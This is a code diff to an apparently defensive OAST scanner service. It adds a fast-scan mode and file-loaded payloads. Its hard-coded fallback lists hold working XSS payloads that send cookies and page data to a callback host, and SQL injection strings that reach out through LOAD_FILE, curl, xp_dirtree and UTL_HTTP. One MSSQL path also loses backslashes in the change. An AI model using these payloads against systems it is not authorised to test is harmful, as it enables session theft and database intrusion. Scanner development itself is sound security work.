@@ -8,6 +8,7 @@ from dataclasses import dataclass
 import aiohttp
 from database import mongodb  # for direct low-level fallback
 from mongo_service import mongo_service
+import json
 """
 OAST (Out-of-Band Application Security Testing) Collaborator Service
 Handles callback generation, monitoring, and management for blind vulnerability detection
@@ -93,19 +94,27 @@ class OASTCollaborator:
             return base
         return f"{self.generate_callback_id()}.{base}"
         
-    def generate_xss_payloads(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
+    def generate_xss_payloads(self, scan_id: Optional[str] = None, scan_mode: str = "full") -> List[Dict[str, Any]]:
         """Generate XSS OAST payloads for blind XSS detection"""
         payloads = []
-        
-        # JavaScript-based payloads
-        js_templates = [
-            '<script>fetch("http://{subdomain}/xss?data="+document.cookie)</script>',
-            '<img src=x onerror="fetch(\'http://{subdomain}/xss?location=\'+location.href)">',
-            '<svg onload="fetch(\'http://{subdomain}/xss?dom=\'+document.documentElement.outerHTML.length)">',
-            '"><script>new Image().src="http://{subdomain}/xss?cookie="+btoa(document.cookie)</script>',
-            '\';fetch("http://{subdomain}/xss?ref="+document.referrer);//'
-        ]
-        
+        # Try to load from file
+        file_path = os.path.join(os.path.dirname(__file__), "payloads", "xss_payloads.txt")
+        js_templates = []
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                js_templates = [line.strip() for line in f if line.strip()]
+        except Exception:
+            # fallback to hardcoded
+            js_templates = [
+                '<script>fetch("http://{subdomain}/xss?data="+document.cookie)</script>',
+                '<img src=x onerror="fetch(\'http://{subdomain}/xss?location=\'+location.href)">',
+                '<svg onload="fetch(\'http://{subdomain}/xss?dom=\'+document.documentElement.outerHTML.length)">',
+                '\"><script>new Image().src="http://{subdomain}/xss?cookie="+btoa(document.cookie)</script>',
+                '\';fetch("http://{subdomain}/xss?ref="+document.referrer);//'
+            ]
+        # Fast scan: only first 10
+        if scan_mode == "fast":
+            js_templates = js_templates[:10]
         for template in js_templates:
             callback_id = self.generate_callback_id()
             subdomain = self.generate_subdomain()
@@ -154,32 +163,39 @@ class OASTCollaborator:
             pass
         return payloads
         
-    def generate_sqli_payloads(self, scan_id: Optional[str] = None) -> List[Dict[str, Any]]:
+    def generate_sqli_payloads(self, scan_id: Optional[str] = None, scan_mode: str = "full") -> List[Dict[str, Any]]:
         """Generate SQL injection OAST payloads for blind SQLi detection"""
         payloads = []
-        
-        # Database-specific OAST payloads
-        db_templates = {
-            "mysql": [
-                "' UNION SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',VERSION()))-- ",
-                "'; SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',USER()))-- ",
-            ],
-            "postgresql": [
-                "'; COPY (SELECT version()) TO PROGRAM 'curl http://{subdomain}/sqli?postgres=1'-- ",
-                "' UNION SELECT NULL,NULL,version() INTO OUTFILE '/dev/null' LINES TERMINATED BY '\ncurl http://{subdomain}/sqli?postgres=version'-- ",
-            ],
-            "mssql": [
-                "'; EXEC master..xp_dirtree '\\\\{subdomain}\\sqli\\mssql'-- ",
-                "' UNION SELECT NULL,NULL,@@version,NULL INTO OUTFILE '\\\\{subdomain}\\sqli\\mssql'-- ",
-            ],
-            "oracle": [
-                "' UNION SELECT UTL_HTTP.request('http://{subdomain}/sqli?oracle='||USER) FROM dual-- ",
-                "'; SELECT UTL_INADDR.get_host_name('{subdomain}') FROM dual-- ",
-            ]
-        }
-        
+        # Try to load from file
+        file_path = os.path.join(os.path.dirname(__file__), "payloads", "sqli_payloads.json")
+        db_templates = {}
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                db_templates = json.load(f)
+        except Exception:
+            # fallback to hardcoded
+            db_templates = {
+                "mysql": [
+                    "' UNION SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',VERSION()))-- ",
+                    "'; SELECT LOAD_FILE(CONCAT('http://{subdomain}/sqli?mysql=',USER()))-- ",
+                ],
+                "postgresql": [
+                    "'; COPY (SELECT version()) TO PROGRAM 'curl http://{subdomain}/sqli?postgres=1'-- ",
+                    "' UNION SELECT NULL,NULL,version() INTO OUTFILE '/dev/null' LINES TERMINATED BY '\ncurl http://{subdomain}/sqli?postgres=version'-- ",
+                ],
+                "mssql": [
+                    "'; EXEC master..xp_dirtree '\\{subdomain}\\sqli\\mssql'-- ",
+                    "' UNION SELECT NULL,NULL,@@version,NULL INTO OUTFILE '\\{subdomain}\\sqli\\mssql'-- ",
+                ],
+                "oracle": [
+                    "' UNION SELECT UTL_HTTP.request('http://{subdomain}/sqli?oracle='||USER) FROM dual-- ",
+                    "'; SELECT UTL_INADDR.get_host_name('{subdomain}') FROM dual-- ",
+                ]
+            }
+        # Fast scan: only first 10 per db type
         for db_type, templates in db_templates.items():
-            for template in templates:
+            use_templates = templates[:10] if scan_mode == "fast" else templates
+            for template in use_templates:
                 callback_id = self.generate_callback_id()
                 subdomain = self.generate_subdomain()
                 payload_text = template.format(subdomain=subdomain)
